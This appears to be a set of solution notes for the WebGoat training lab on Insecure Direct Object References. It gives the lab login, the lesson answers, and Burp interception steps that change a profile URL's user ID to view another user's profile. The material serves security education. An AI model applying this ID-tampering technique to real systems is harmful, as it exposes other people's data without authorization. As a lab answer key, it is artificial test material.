# Insecure Direct Object References

## 2 - Authenticate First, Abuse Authorization Later

user/pass user: `tom`
pass: `cat`


## 3 - Observing Differences & Behaviors

1. When click on View Profile

Request
```
GET /WebGoat/IDOR/profile 
```
On Screen
```
ame:Tom Cat
color:yellow
size:small
```
In the response
```
{
  "role" : 3,
  "color" : "yellow",
  "size" : "small",
  "name" : "Tom Cat",
  "userId" : "2342384"
}
```

Answer: 

Submit Diff: `role,userId`

## 4 - Guessing & Predicting Patterns

Answer:

URL to view your own profile: 
```
WebGoat/IDOR/profile/2342384
```

## 5 - Playing with the Patterns
### View another profile
1. Click on View Profile button
2. Intercept with Burp
3. Change the URL from
```
GET /WebGoat/IDOR/profile/%7BuserId%7D
```

to 
```
GET /WebGoat/IDOR/profile/1
```


### Edit Another Profile